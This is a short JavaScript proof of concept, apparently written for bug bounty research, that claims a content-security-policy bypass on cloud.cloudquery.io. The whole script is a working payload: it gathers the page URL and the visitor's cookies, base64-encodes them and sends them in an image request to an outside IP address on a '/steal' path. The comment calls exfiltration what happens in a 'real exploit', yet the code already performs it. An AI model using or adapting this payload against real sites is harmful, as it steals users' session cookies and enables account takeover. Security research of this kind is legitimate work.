// CloudQuery CSP Bypass PoC - Bug Bounty Research
(function() {
  var d = {
    url: window.location.href,
    cookies: document.cookie,
    ts: new Date().toISOString()
  };
  // In real exploit: exfiltrate credentials
  new Image().src = 'https://3.108.6.174:8920/steal?d=' + btoa(JSON.stringify(d));
  console.log('[CSP BYPASS] cloud.cloudquery.io context confirmed', d);
})();
